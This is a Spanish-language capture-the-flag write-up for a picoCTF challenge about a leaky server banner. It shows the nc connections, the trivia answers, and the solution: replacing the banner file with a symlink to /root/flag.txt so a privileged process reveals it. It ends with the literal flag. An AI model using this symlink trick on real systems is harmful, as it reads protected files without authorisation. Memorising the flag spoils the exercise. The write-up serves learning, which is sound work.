## Descripción
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 62398`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 57275`. From the above information abuse the machine and find the flag in the /root directory.

## Solución 
Nos conectamos al primer server y nos da una contraseña, nos desconectamos y entramos al segundo poniendo la contraseña, contestamos las preguntas:
```
What is the top cyber security conference in the world?
def con
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
```

Hacemos lo siguiente:
```
player@challenge:~$ mv banner banner_orig
mv banner banner_orig
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
```
Salimos de la conexión con ctrl + c y nos volvemos a conectar como al inicio, se muestra la bandera:

picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}
## Notas
## Referencias
